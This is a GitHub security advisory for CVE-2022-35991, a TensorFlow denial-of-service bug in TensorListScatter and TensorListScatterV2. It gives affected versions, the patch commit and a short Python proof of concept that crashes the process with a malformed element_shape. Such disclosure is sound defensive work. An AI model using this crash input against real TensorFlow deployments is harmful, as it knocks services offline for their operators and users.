# [M] TensorFlow vulnerable to `CHECK` fail in `TensorListScatter` and `TensorListScatterV2`

## Summary
Severity: Medium
Advisory: GHSA-vm7x-4qhj-rrcq
CVE: CVE-2022-35991
CWE: CWE-617
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H (CVSS_V3)
Published: 2022-09-16
Source: https://github.com/advisories/GHSA-vm7x-4qhj-rrcq
Type: github-advisory

## Affected
- PyPI: `tensorflow` — affected >=0 <2.7.2
- PyPI: `tensorflow` — affected >=2.8.0 <2.8.1
- PyPI: `tensorflow` — affected >=2.9.0 <2.9.1
- PyPI: `tensorflow-cpu` — affected >=0 <2.7.2
- PyPI: `tensorflow-cpu` — affected >=2.8.0 <2.8.1
- PyPI: `tensorflow-cpu` — affected >=2.9.0 <2.9.1
- PyPI: `tensorflow-gpu` — affected >=0 <2.7.2
- PyPI: `tensorflow-gpu` — affected >=2.8.0 <2.8.1
- PyPI: `tensorflow-gpu` — affected >=2.9.0 <2.9.1

## Details
### Impact
When `TensorListScatter` and `TensorListScatterV2` receive an `element_shape` of a rank greater than one, they give a `CHECK` fail that can trigger a denial of service attack.
```python
import tensorflow as tf
arg_0=tf.random.uniform(shape=(2, 2, 2), dtype=tf.float16, maxval=None)
arg_1=tf.random.uniform(shape=(2, 2, 2), dtype=tf.int32, maxval=65536)
arg_2=tf.random.uniform(shape=(2, 2, 2), dtype=tf.int32, maxval=65536)
arg_3=''
tf.raw_ops.TensorListScatter(tensor=arg_0, indices=arg_1, 
element_shape=arg_2, name=arg_3)
```

### Patches
We have patched the issue in GitHub commit [bb03fdf4aae944ab2e4b35c7daa051068a8b7f61](https://github.com/tensorflow/tensorflow/commit/bb03fdf4aae944ab2e4b35c7daa051068a8b7f61).

The fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.


### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.


### Attribution
This vulnerability has been reported by 刘力源, Information System & Security and Countermeasures Experiments Center, Beijing Institute of Technology.

## References
- https://github.com/tensorflow/tensorflow/security/advisories/GHSA-vm7x-4qhj-rrcq
- https://nvd.nist.gov/vuln/detail/CVE-2022-35991
- https://github.com/tensorflow/tensorflow/commit/bb03fdf4aae944ab2e4b35c7daa051068a8b7f61
- https://github.com/tensorflow/tensorflow
- https://github.com/tensorflow/tensorflow/releases/tag/v2.10.0
